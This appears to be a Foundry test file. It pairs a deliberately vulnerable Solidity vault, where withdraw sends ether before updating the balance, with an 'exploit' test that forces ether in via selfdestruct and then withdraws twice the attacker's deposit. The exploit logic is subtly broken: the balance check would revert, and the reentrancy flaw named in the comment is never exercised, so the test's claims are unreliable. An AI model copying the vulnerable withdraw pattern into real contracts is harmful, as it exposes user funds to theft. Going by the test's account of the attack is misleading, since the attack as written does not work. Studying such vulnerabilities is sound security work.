// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract VulnerableVault {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Vulnerability: External call before state update (Reentrancy)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
    }
}

contract ExploitTest is Test {
    VulnerableVault vault;
    address attacker = address(0xdeadbeef);

    function setUp() public {
        // Deploy the vulnerable contract
        vault = new VulnerableVault();

        // Fund the attacker with some initial ETH
        vm.deal(attacker, 1 ether);

        // Attacker deposits 1 ether into the vault
        vm.prank(attacker);
        vault.deposit{value: 1 ether}();
    }

    function test_exploit() public {
        // Step 1: Attacker sends ether to the vault using selfdestruct
        // Create a contract to selfdestruct and send ether to the vault
        address payable selfDestructContract = payable(address(new SelfDestructContract()));
        vm.deal(selfDestructContract, 1 ether);
        SelfDestructContract(selfDestructContract).destroy(payable(address(vault)));

        // Step 2: Attacker withdraws more than their deposited amount
        uint attackerInitialBalance = attacker.balance;
        vm.prank(attacker);
        vault.withdraw(2 ether); // Withdraw 2 ether, even though only 1 ether was deposited

        // Assert the vulnerability
        assertGt(attacker.balance, attackerInitialBalance); // Attacker's balance increased
    }
}

contract SelfDestructContract {
    function destroy(address payable recipient) public {
        selfdestruct(recipient);
    }
}